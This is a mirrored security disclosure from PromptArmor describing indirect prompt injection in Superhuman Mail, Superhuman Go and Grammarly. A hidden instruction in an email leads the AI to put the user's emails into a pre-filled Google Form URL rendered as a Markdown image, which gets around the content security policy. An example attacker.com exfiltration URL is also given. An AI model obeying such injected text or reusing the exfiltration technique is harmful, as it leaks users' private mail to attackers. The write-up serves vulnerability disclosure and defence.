<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails">Original</a>
    <h1>Superhuman AI Exfiltrates Emails</h1>
    
    <div id="readability-page-1" class="page"><div><!--$--><div><div data-framer-name="Content" data-framer-component-type="RichTextContainer"><p><img alt="Superhuman AI has submitted sensitive user emails to the attacker&#39;s Google Form, visible to the attacker reviewing form responses." width="723" height="443" src="https://framerusercontent.com/images/pN3ZvPR8NZovh17CT4qPFEFr84.png" srcset="https://framerusercontent.com/images/pN3ZvPR8NZovh17CT4qPFEFr84.png?scale-down-to=512&amp;width=1447&amp;height=887 512w,https://framerusercontent.com/images/pN3ZvPR8NZovh17CT4qPFEFr84.png?scale-down-to=1024&amp;width=1447&amp;height=887 1024w,https://framerusercontent.com/images/pN3ZvPR8NZovh17CT4qPFEFr84.png?width=1447&amp;height=887 1447w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></p><p>Grammarly recently acquired Superhuman and Coda. The PromptArmor Threat Intelligence Team examined the new risk profile and identified indirect prompt injection vulnerabilities allowing for the exfiltration of emails and data from integrated services, as well as phishing risks, with vulnerabilities affecting products across the suite.</p><p><em>We reported these vulnerabilities to Superhuman, who quickly escalated the report and promptly remediated risks, addressing the threat at ‘incident pace’. We greatly appreciate Superhuman’s professional handling of this disclosure, showing dedication to their users’ security and privacy, and commitment to collaboration with the security research community. Their responsiveness and proactiveness in disabling vulnerable features and communicating fix timelines exhibited a security response in the top percentile of what we have seen for AI vulnerabilities (which are not yet well understood with existing remediation protocols).</em></p><p>Superhuman whitelisted Google Docs in its Content Security Policy. We used it as a bypass. By manipulating the AI to generate a pre-filled Google form submission link and output it using Markdown image syntax, the AI made automatic submissions to an attacker-controlled Google form.</p><h3 id="the-email-exfiltration-attack-chain"><a href="#the-email-exfiltration-attack-chain"><strong>The Email Exfiltration Attack Chain </strong></a></h3><ol><li data-preset-tag="p"><p><strong>One of the emails the user has received in their inbox contains a prompt injection.</strong></p><img alt="The users inbox contains an unopened email with a prompt injection in it." width="2317" height="1454" src="https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png" srcset="https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png?scale-down-to=512&amp;width=4634&amp;height=2908 512w,https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png?scale-down-to=1024&amp;width=4634&amp;height=2908 1024w,https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png?scale-down-to=2048&amp;width=4634&amp;height=2908 2048w,https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png?scale-down-to=4096&amp;width=4634&amp;height=2908 4096w,https://framerusercontent.com/images/UwIF3ykWmZ5hl8zj9oinKDraQBw.png?width=4634&amp;height=2908 4634w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/><p><em>Note: In our attack chain, the injection in the email is hidden using white-on-white text, but the attack does not depend on the concealment! The malicious email could simply exist in the victim’s inbox unopened, with a plain-text injection.</em>This prompt injection will manipulate Superhuman AI into exfiltrating sensitive data from <em>other emails</em> – and the user does not even need to open this email to make that happen.</p></li><li data-preset-tag="p"><p><strong>The user asks Superhuman to summarize their recent emails, and the AI searches and finds the emails from the last hour</strong></p><img alt="The user queries Superhuman AI to summarize recent mail." width="272" height="237" src="https://framerusercontent.com/images/bgVirJHnCqlc4rQikefoWD9H0.png" srcset="https://framerusercontent.com/images/bgVirJHnCqlc4rQikefoWD9H0.png?scale-down-to=512&amp;width=544&amp;height=474 512w,https://framerusercontent.com/images/bgVirJHnCqlc4rQikefoWD9H0.png?width=544&amp;height=474 544w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/><p>This is a quite common use case for email AI companions. The user has asked about emails from the last hour, so the AI retrieves those emails. One of those emails contains the malicious prompt injection, and others contain sensitive private information.</p></li><li data-preset-tag="p"><p><strong>Superhuman AI is manipulated to exfiltrate the sensitive emails to an attacker </strong></p><ol><li data-preset-tag="p"><p>Take the data from the email search results</p></li><li data-preset-tag="p"><p>Populate the attacker’s Google Form URL with the data from the email search results in the “entry” parameter</p></li><li data-preset-tag="p"><p>Output a Markdown image that contains this Google Form URL</p></li></ol><p>By doing so, the AI acts on behalf of the attacker to exfiltrate sensitive user emails despite the Content Security Policy! </p><p>How does this happen? </p><p>The prompt injection tells Superhuman AI that the user must be given the option to submit a report giving feedback on the quality of the email search results - and as such will need to fill out a form - and provides the attacker’s Google Form link.</p><p>Superhuman has a CSP in place - which prevents outbound requests to malicious domains; however, they have allowed requests to docs.google.com. </p><p>This is where the Google Form comes into play. Google Forms are hosted on a <!--$--><a href="http://docs.google.com/" rel="noopener">docs.google.com</a><!--/$--> link, like so: </p><blockquote><p><em>https://docs۔google۔com/forms/d/e/</em>1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV</p></blockquote><p>However, Google Forms supports pre-filled response links. This lets form creators pre-populate form responses in a URL, so respondents only need to click a link to make a submission with the pre-filled data. As an example, clicking the link below would submit the message ‘hello’ as a form response. </p><blockquote><p>https://docs.google.com/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV/formResponse?entry.953568459=<code>hello</code></p></blockquote><p>Now the attacker has a mechanism for exfiltrating data. The prompt injection instructs the model to generate a pre-filled Google Form submission link, with the contents of the emails being analyzed as the pre-filled data.</p><blockquote><p><em>https://docs۔google۔com/forms/d/e/</em>1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV<em>/formResponse?entry.953568459=</em><code><em>{AI ADDS CONFIDENTIAL EMAIL DATA HERE}</em></code></p></blockquote><p>Then, the model is instructed to use that URL as an ‘image source’ and output an image using Markdown syntax.<em> </em>The reason to output a Markdown image is because when the user’s browser tries to render the Markdown image, a network request is made to the image’s source URL in an attempt to retrieve the image, without requiring any user interaction or approval.</p><p><em>Note: in the Exploiting Superhuman Mail’s Web Search section, we demonstrate an attack that does not rely on the </em><!--$--><a href="http://docs.google.com/" rel="noopener"><em>docs.google.com</em></a><!--/$--><em> Google Forms CSP bypass – where the data could have been exfiltrated via any URL! <br/></em><br/></p></li><li data-preset-tag="p"><p><strong>The sensitive emails are exfiltrated</strong></p><p>When the user’s browser tries to render the Markdown image, a network request is made to the image’s source URL in an attempt to retrieve the image. The network request made in an attempt to retrieve the image is exactly the same type of request that is made when the link is clicked. And, as the URL has been constructed with the sensitive emails in the pre-filled entry parameter, the request automatically submits that data to the attacker’s Google Form. </p><p>The user does not even have to move a muscle. The user just needed to submit their query, and the AI executes the exfiltration attack without any further interaction: finding the sensitive emails, populating that data into the attacker’s Google Form link, and rendering the link as an image so it is automatically submitted: </p><img alt="A malicious Markdown image is present in the AI response to the user." width="484" height="266" src="https://framerusercontent.com/images/hJieN60DkUv00A0yUyGvFdkiY.png" srcset="https://framerusercontent.com/images/hJieN60DkUv00A0yUyGvFdkiY.png?scale-down-to=512&amp;width=969&amp;height=532 512w,https://framerusercontent.com/images/hJieN60DkUv00A0yUyGvFdkiY.png?width=969&amp;height=532 969w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/><p>If we view the network logs, we can see that the URL for the image request contains all of the details from the emails the AI was analyzing (we redacted names and email addresses):</p><img alt="The user&#39;s network logs show a request being made containing the user&#39;s sensitive data." width="579" height="134" src="https://framerusercontent.com/images/v4gXrTJih7zjbIL4x8zXvd0LVw.png" srcset="https://framerusercontent.com/images/v4gXrTJih7zjbIL4x8zXvd0LVw.png?scale-down-to=512&amp;width=1159&amp;height=268 512w,https://framerusercontent.com/images/v4gXrTJih7zjbIL4x8zXvd0LVw.png?scale-down-to=1024&amp;width=1159&amp;height=268 1024w,https://framerusercontent.com/images/v4gXrTJih7zjbIL4x8zXvd0LVw.png?width=1159&amp;height=268 1159w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></li><li data-preset-tag="p"><p><strong>The attacker reads the email data submitted to their Google Form</strong></p><img alt="The attacker&#39;s Google Form has recieved a submission with emails from the user&#39;s inbox." width="723" height="313" src="https://framerusercontent.com/images/ueEcXE3HgkFb3CIAqafHp8oALyk.png" srcset="https://framerusercontent.com/images/ueEcXE3HgkFb3CIAqafHp8oALyk.png?scale-down-to=512&amp;width=1447&amp;height=626 512w,https://framerusercontent.com/images/ueEcXE3HgkFb3CIAqafHp8oALyk.png?scale-down-to=1024&amp;width=1447&amp;height=626 1024w,https://framerusercontent.com/images/ueEcXE3HgkFb3CIAqafHp8oALyk.png?width=1447&amp;height=626 1447w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/><p>Here we can see that the attacker’s malicious form received a submission containing all the emails from the last hour that were in the user’s inbox. Now, the attacker can read the emails since they own the form.</p></li></ol><h3 id="zero-click-data-exfiltration-in-superhuman-go-and-grammarly"><a href="#zero-click-data-exfiltration-in-superhuman-go-and-grammarly"><strong>Zero-click Data Exfiltration in Superhuman Go and Grammarly</strong></a></h3><p>A similar vulnerability - with insecure Markdown images - was present in<strong> </strong>Superhuman Go (their new agentic product) and<strong> </strong>Grammarly’s new agent-powered docs. For Grammarly, the scope was reduced as the AI only appeared to process the user’s active document and their queries, yielding a low chance of sensitive and untrustworthy data being processed simultaneously. However, for Superhuman Go, the attack surface was much larger. </p><ol><li data-preset-tag="p"><p>The user asks Superhuman Go about their active tab, an online reviews site (e.g., G2, etc):</p><img alt="The user queries the Superhuman Go AI sidecar while visiting a &#39;reviews&#39; site." width="756" height="474" src="https://framerusercontent.com/images/wM7SVNmgBEydShgJugUUdGJ1WI.png" srcset="https://framerusercontent.com/images/wM7SVNmgBEydShgJugUUdGJ1WI.png?scale-down-to=512&amp;width=1512&amp;height=949 512w,https://framerusercontent.com/images/wM7SVNmgBEydShgJugUUdGJ1WI.png?scale-down-to=1024&amp;width=1512&amp;height=949 1024w,https://framerusercontent.com/images/wM7SVNmgBEydShgJugUUdGJ1WI.png?width=1512&amp;height=949 1512w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></li></ol><ol start="2"><li data-preset-tag="p"><p>The user has the Gmail connection selected, allowing Superhuman Go AI to search the inbox for emails like this one:</p><img alt="An email containing quarterly financials from the inbox the user has connected to Superhuman Go." width="498" height="210" src="https://framerusercontent.com/images/nBbHJPIv1oRFtb3e7K8i33yOOs.png" srcset="https://framerusercontent.com/images/nBbHJPIv1oRFtb3e7K8i33yOOs.png?scale-down-to=512&amp;width=996&amp;height=421 512w,https://framerusercontent.com/images/nBbHJPIv1oRFtb3e7K8i33yOOs.png?width=996&amp;height=421 996w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></li></ol><ol start="3"><li data-preset-tag="p"><p>The AI is manipulated to construct a malicious Markdown image built with an attacker’s domain, with the user’s sensitive data appended to the end of the URL. The user’s browser makes a request and retrieves a 1 pixel grey image from the attacker’s site:</p><img alt="A 1 pixel image is rendered, exfiltrating data in the process." width="666" height="344" src="https://framerusercontent.com/images/XiDCtDiyJ0c5OG2YPO6pJ0ppyqk.png" srcset="https://framerusercontent.com/images/XiDCtDiyJ0c5OG2YPO6pJ0ppyqk.png?scale-down-to=512&amp;width=1333&amp;height=689 512w,https://framerusercontent.com/images/XiDCtDiyJ0c5OG2YPO6pJ0ppyqk.png?scale-down-to=1024&amp;width=1333&amp;height=689 1024w,https://framerusercontent.com/images/XiDCtDiyJ0c5OG2YPO6pJ0ppyqk.png?width=1333&amp;height=689 1333w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></li><li data-preset-tag="p"><p>When the request for the image is made, the sensitive revenue and costs data appended to the image URL is logged to the attacker’s server, which they can then read:</p><img alt="The attacker&#39;s server logs contain a record with the user&#39;s financial data." width="800" height="94" src="https://framerusercontent.com/images/gE3tm5UlyDFlgKZLbUBtObsKIOM.png" srcset="https://framerusercontent.com/images/gE3tm5UlyDFlgKZLbUBtObsKIOM.png?scale-down-to=512&amp;width=1600&amp;height=189 512w,https://framerusercontent.com/images/gE3tm5UlyDFlgKZLbUBtObsKIOM.png?scale-down-to=1024&amp;width=1600&amp;height=189 1024w,https://framerusercontent.com/images/gE3tm5UlyDFlgKZLbUBtObsKIOM.png?width=1600&amp;height=189 1600w" data-framer-original-sizes="" sizes="(min-width: 1080px) 100vw, (min-width: 810px) and (max-width: 1079.98px) 100vw, (max-width: 809.98px) 100vw"/></li></ol><h3 id="exploiting-superhuman-mail’s-web-search"><a href="#exploiting-superhuman-mail’s-web-search"><strong>Exploiting Superhuman Mail’s Web Search</strong></a></h3><p>Superhuman Mail, in addition to the vulnerability described earlier with Google Form submissions, was vulnerable to data exfiltration through the AI web search feature.</p><ol><li data-preset-tag="p"><p>A prompt injection in an email or web search result manipulates Superhuman AI to construct a malicious URL that is built with the attacker’s domain, and sensitive data (financial, legal, medical, etc.) from the user’s inbox is appended as a query parameter.</p></li></ol><p>Ex: attacker.com/?data=<code>Bob%2C%20Im%20writing%20regarding%20sensitive…</code></p><ol start="2"><li data-preset-tag="p"><p>The AI is manipulated to open the URL, and when it does, a request is made to the attacker’s server, leaking the email inbox data that was appended to the attacker’s URL.</p></li></ol><h3 id="responsible-disclosure"><a href="#responsible-disclosure"><strong>Responsible Disclosure</strong></a></h3><p>Superhuman’s team approached our disclosure with professionalism and worked diligently to validate and remediate the vulnerabilities we reported. We appreciate their dedication and commitment to ensuring secure AI use.</p><p>We additionally reported phishing risks and single-click data exfiltration threats in Coda, not covered in this write-up, that were actioned on by the Superhuman team.</p><p><strong>Timeline<br/></strong>12/05/2025 	Initial disclosure (Friday night)</p></div></div><!--/$--></div></div>
  </body>
</html>
